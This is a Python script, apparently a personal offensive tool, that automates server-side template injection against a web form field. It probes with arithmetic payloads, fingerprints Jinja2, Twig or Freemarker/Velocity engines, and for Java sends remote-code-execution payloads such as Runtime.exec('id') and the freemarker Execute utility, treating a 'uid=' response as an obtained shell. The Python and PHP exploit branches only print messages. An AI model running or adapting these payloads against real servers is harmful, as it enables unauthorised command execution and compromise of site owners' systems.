import requests
import re

def templateInjection(url, key):
    print("Trying to identify a template injection...")
    payloads = ["22*22", "{22*22}", "{{22*22}}", "{{{22*22}}}", "#{22*22}", "${22*22}", "{{=22*22}}", "<%=22*22%>", "[[${22*22}]]"]
    for payload in payloads:
        r = requests.post(url, data={f"{key}": payload})
        print(f"Testing payload {payload}")
        if re.search(r"\b484\b", r.text):
            return True

def checkLanguage(url, key):
    print("Trying to identify the language...")
    if pythonChecker(url, key): return "python"
    elif phpChecker(url, key): return "php"
    elif javaChecker(url, key): return "java"
    else: return False
    
def pythonChecker(url, key):
    payloads = ["{{7*'7'}}", "{{''.__class__}}"]
    footprints = [r"\b7777777\b", r"<class\s*['\"]str['\"]\s*>|<type\s*['\"]str['\"]\s*>"]
    for payload, footprint in zip(payloads, footprints):
        r = requests.post(url, data={f"{key}": payload})
        print(f"Testing payload {payload}")
        if re.search(footprint, r.text):
            return True
    return False

def phpChecker(url, key):
    payloads = ["{{7~7}}", "{{constant('PHP_VERSION')}}", "{{[1,2,3]|join(',')}}"]
    footprints = [r"\b77\b", r"\d+\.\d+\.\d+", r" \b1,2,3\b"]
    for payload, footprint in zip(payloads, footprints):
        r = requests.post(url, data={f"{key}": payload})
        print(f"Testing payload {payload}")
        if re.search(footprint, r.text):
            print(f"{r.text} avec la requête {payload}")
            return True
    return False

def javaChecker(url, key):
    payloads = ["${'freemarker'.toUpperCase()}", "${.version}", "#set($x=22*22) $x"]
    footprints = [r"\bFREEMARKER\b", r"\d+\.\d+\.\d+", r"\b484\b"]
    for payload, footprint in zip(payloads, footprints):
        r = requests.post(url, data={f"{key}": payload})
        print(f"Testing payload {payload}")
        if re.search(footprint, r.text):
            return True
    return False

def exploit(url, key, language):
    match language:
        case "python":
            print("\n------------------\nPython identified\n------------------")
            print("Trying to open a shell using Jinja2 patterns")
            print("------------------------------------------------------")
        case "php":
            print("\n------------------\nPHP identified\n------------------")
            print("Trying to open a shell using Twig patterns")
            print("------------------------------------------------------")
        case "java":
            print("\n------------------\nJava identified\n------------------")
            print("Trying to open a shell using Freemarker/Velocity patterns")
            print("------------------------------------------------------")
            payloads = ['${"java.lang.Runtime".getClass().forName("java.lang.Runtime").getRuntime().exec("id")}', '${"freemarker.template.utility.Execute"?new()("id")}', 
                        '${"java.lang.Runtime".getClass().forName("java.lang.Runtime").getRuntime().exec("id").getInputStream().readAllBytes()?join("")}', '#set($rt = $null.getClass().forName("java.lang.Runtime")) $rt.getRuntime().exec("id")']
            for payload in payloads:
                try:
                    r = requests.post(url, data={f"{key}": payload})
                    if re.search(r"uid=\d+\(.+?\)", r.text):
                        print(f"Shell obtained with payload '{payload}'\n")
                        return True
                except:
                    continue
            print("No shell obtained but SSTI is confirmed")
def main():
    url = ""
    key = ""
    if templateInjection(url, key):
        print("\n------------------\nTemplate injection confirmed\n------------------\n")
        lang = checkLanguage(url, key)
        if lang:
            exploit(url, key, lang)
        else:
            print("Template engine not found but injection confirmed")

    else:
        print("No template injection found")
        exit()



if __name__ == "__main__":
    main()